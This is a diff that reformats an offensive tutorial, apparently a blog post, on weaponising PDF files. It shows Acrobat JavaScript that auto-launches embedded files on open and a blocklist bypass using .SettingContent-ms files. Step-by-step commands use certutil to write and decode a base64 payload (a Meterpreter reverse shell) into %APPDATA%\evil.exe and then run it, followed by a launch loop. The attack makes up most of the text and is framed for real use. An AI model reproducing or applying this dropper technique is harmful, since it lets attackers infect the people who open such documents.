@@ -27,60 +27,68 @@ Our JavaScript payload is pretty simple: we just add a single call to exportData
 
 nLaunch is just an integer, and it has three valid values:
 
-    Prompt the user for a path and save the file there
-    Prompt the user for a path, save the file, and ask the operating system to open it
-    Pick a temporary location, save the file there, and ask the operating system to open it
+    0. Prompt the user for a path and save the file there
+    1. Prompt the user for a path, save the file, and ask the operating system to open it
+    2. Pick a temporary location, save the file there, and ask the operating system to open it
 
 That last option sounds great for malware. Assuming we embedded a file called myExploit.exe, we would add the following JavaScript:
 
-this.exportDataObject({
-    cName: "myExploit.exe",
-    nLaunch: 2,
-});
+    this.exportDataObject({
+         cName: "myExploit.exe",
+         nLaunch: 2,
+    });
 
 and it would run as soon as the PDF was opened, right? Well, not quite. Unfortunately, there’s a bit more to it; Adobe Reader (and most other readers) will prevent the launch of common executable files. For example, .exe, .js, .vba, and .bat files cannot be opened.
-Evading the Blacklist
 
-There are many ways to evade the blacklist, such as Microsoft Word documents with malicious macros embedded in them (read more), but recently, researchers discovered that another kind of file could be used: .SettingContent-ms. As explained by the SpecterOps team, these are just XML documents pointing to specific places in the Windows 10 settings GUI. However, they contain a field called DeepLink which can contain any arbitrary executable which will be run when the SettingsContent-ms file is executed.
-Deploying a Payload
+# *Evading the Blacklist*
+
+There are many ways to evade the blacklist, such as Microsoft Word documents with malicious macros embedded in them [read more](https://isc.sans.edu/diary/PDF+maldoc1+maldoc2/20079), but recently, researchers discovered that another kind of file could be used: .SettingContent-ms. As explained by the [SpecterOps team](https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39), these are just XML documents pointing to specific places in the Windows 10 settings GUI. However, they contain a field called DeepLink which can contain any arbitrary executable which will be run when the SettingsContent-ms file is executed.
+
+
+# *Deploying a Payload*
 
 Let’s bring this all together. How would we use this in a real attack?
 
 There are a few steps we need to perform in order to get this attack working.
-1: Create a Payload
+
+### - 1: Create a Payload
 
 There are many great ways of creating effective payloads. In this case, I’ll assume you have a payload already; my payload of choice is a Meterpreter reverse shell encoded with some type of cloaker.
-2: Encode the Payload in Base64
+### - 2: Encode the Payload in Base64
 
 We can use certutil.exe -encode InputFile EncodedFile on Windows or base64 input > output on Linux to encode and decode files with Base64. This will let us more readily insert it where it is needed.
-3: Embedded Files
+### - 3: Embedded Files
 
 We need to run 3 commands, so we’ll use the above method to embed three files. They will all be valid SettingContent-ms XML, differing only in the DeepLink node.
 
-    PutFile.SettingContent-ms which will echo the Base64 encoded payload to disk at a known path (echo b46c827y... > %APPDATA%\evil.b64).
-    Decode.SettingContent-ms which will decode the Base64 encoded payload into an EXE ( certutil -decode %APPDATA%\evil.b64 %APPDATA%\evil.exe)
-    Execute.SettingContent-ms which will actually run that file. (%APPDATA%\evil.exe)
+    1. PutFile.SettingContent-ms which will echo the Base64 encoded payload to disk at a known path (echo b46c827y... > %APPDATA%\evil.b64).
+    
+    2. Decode.SettingContent-ms which will decode the Base64 encoded payload into an EXE ( certutil -decode %APPDATA%\evil.b64 %APPDATA%\evil.exe)
+    
+    3. Execute.SettingContent-ms which will actually run that file. (%APPDATA%\evil.exe)
 
-4: Scripts
+### - 4: Scripts
 
 Now, we need a single script which will run all of these:
 
-var files = ["PutFile", "Decode", "Execute"];
-for (var i = 0; i < files.len; i++) {
+    var files = ["PutFile", "Decode", "Execute"];
+    for (var i = 0; i < files.len; i++) {
 	this.exportDataObject({
 		cName: files[i] + ".SettingContent-ms",
 		nLaunch: 2,
 	});
-}
+   }
 
-5: Pwnage!
+### -5: Pwnage!
 
 Now we have our Metasploit payload running on the target! Congratulations, time to move into post-exploitation.
-Alternative Methods
+
+# Alternative Methods
 
 Another method would be to use Reflective PE Injection, converting a PowerShell process into the process for our executable. To learn more about this, check out this post.
-Conclusion
+
+# Conclusion
 
 PDF files are extremely complex, and the applications that read them tend to be old and full of cruft, designed without security in mind. A black-listing method will never be effective in eliminating all dangerous files, as we can see here. This technique requires no exploits; we just ask the OS to run a file for us and it does so!
 
-Last updated Jun 8 2023 
+Last updated Jun 15 2023 
